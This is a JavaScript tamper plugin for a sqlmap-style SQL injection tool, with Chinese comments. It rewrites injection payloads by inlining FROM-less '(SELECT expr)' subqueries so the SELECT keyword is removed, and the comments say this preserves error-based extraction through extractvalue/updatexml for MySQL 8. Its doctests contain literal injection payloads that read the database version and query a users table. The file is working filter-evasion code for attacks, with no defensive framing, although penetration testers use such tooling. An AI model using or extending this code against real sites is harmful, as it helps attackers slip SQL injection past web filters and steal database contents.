// 对标 sqlmap 无同名插件（本仓原创，MySQL 8 专用）：
// FROM-less 标量子查询 `(SELECT expr)` 内联化为 `expr`，消除 SELECT 关键字。
// MySQL 语义等价：SELECT 无 FROM 时只做表达式求值，去掉 SELECT 后在同一求值点
// 产生相同值（version()/CONCAT()/CAST() 等标量函数），extractvalue/updatexml
// 的报错取数形态因此保持同一报错内容（真机语义等价实证见 doctests 与靶场验证）。
// 带 FROM 的子查询（真取数）保持原样 —— 那类没有无 SELECT 的等价形式。
// 引号状态机：字符串/标识符字面量内的 "SELECT" 与括号一律不动。

/** 字符串字面量内容打码（保留引号与占位宽度）后，FROM 关键词是否真的出现在代码层。
 *  字符串里的 'FROM users' 不是表引用 —— 直接正则会把它误判成有 FROM 而放弃内联。 */
function hasTopLevelFrom(expr) {
  const masked = String(expr).replace(
    /'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|`(?:[^`\\]|\\.)*`/g,
    (m) => m.replace(/[^\s]/g, '_'),
  );
  return /\bfrom\b/i.test(masked);
}

export const scalarselectinline = {
  name: 'scalarselectinline',
  description: 'FROM-less 标量子查询 (SELECT expr) → expr（消除 SELECT，MySQL 语义等价）',
  doctests: [
    {
      input: "1 AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))",
      output: "1 AND extractvalue(1,concat(0x7e,CONCAT('__S__',version(),'__E__')))",
    },
    { input: '1 AND (SELECT 1)=1', output: '1 AND 1=1' },
    // 有 FROM：真取数子查询，无等价形式，保持原样
    { input: "1 AND (SELECT name FROM users LIMIT 1)='x'", output: "1 AND (SELECT name FROM users LIMIT 1)='x'" },
    // 派生表：FROM 子句里的 (SELECT 1,2) 必须保持原样（内联会破坏语法）
    { input: '1 AND (SELECT 1 FROM (SELECT 1,2) x)=1', output: '1 AND (SELECT 1 FROM (SELECT 1,2) x)=1' },
    // 字符串字面量内的 "SELECT" 与括号不动
    { input: "1 AND name='(SELECT x)'", output: "1 AND name='(SELECT x)'" },
    // 嵌套：内层先内联，外层随后（幂等收敛）
    { input: '1 AND (SELECT CONCAT((SELECT 1)))=1', output: '1 AND CONCAT(1)=1' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    let s = String(payload ?? '');
    // 收敛循环：嵌套子查询外层先内联后，内层的 (SELECT ...) 在下一轮成为候选。
    // 每轮对全串做一次引号感知扫描；无候选时退出（幂等）。
    for (let pass = 0; pass < 8; pass += 1) {
      let out = '';
      let i = 0;
      let inStr = null;
      let changed = false;
      while (i < s.length) {
        const ch = s[i];
        if (inStr) {
          out += ch;
          if (ch === '\\') { out += s[i + 1] || ''; i += 2; continue; }
          if (ch === inStr) inStr = null;
          i += 1;
          continue;
        }
        if (ch === "'" || ch === '"' || ch === '`') { inStr = ch; out += ch; i += 1; continue; }
        if (ch === '(' && /^\(\s*select[\s(]/i.test(s.slice(i, i + 16))) {
          // 引号感知地找配对右括号
          let depth = 0;
          let j = i;
          let str = null;
          for (; j < s.length; j += 1) {
            const c2 = s[j];
            if (str) {
              if (c2 === '\\') { j += 1; continue; }
              if (c2 === str) str = null;
              continue;
            }
            if (c2 === "'" || c2 === '"' || c2 === '`') { str = c2; continue; }
            if (c2 === '(') depth += 1;
            else if (c2 === ')') {
              depth -= 1;
              if (depth === 0) break;
            }
          }
          if (j < s.length) {
            const inner = s.slice(i + 1, j);
            if (/^(\s*select\s+)([\s\S]+)$/i.test(inner) && !hasTopLevelFrom(inner)) {
              // FROM-less 标量子查询 → 内联（连外层括号一起去掉，少两个标点预算）
              out += inner.replace(/^\s*select\s+/i, '').trim();
              i = j + 1;
              changed = true;
              continue;
            }
            // 有 FROM（或形态不符）⇒ **整棵子树跳过**：内层的 (SELECT ...) 可能属于
            // 外层查询的 FROM 子句（派生表），从外面无法区分 —— 保守不动（实测：
            // (SELECT 1 FROM (SELECT 1,2) x) 的派生表被内联破坏过）。
            out += s.slice(i, j + 1);
            i = j + 1;
            continue;
          }
        }
        out += ch;
        i += 1;
      }
      s = out;
      if (!changed) break;
    }
    return s;
  },
};
export default scalarselectinline;
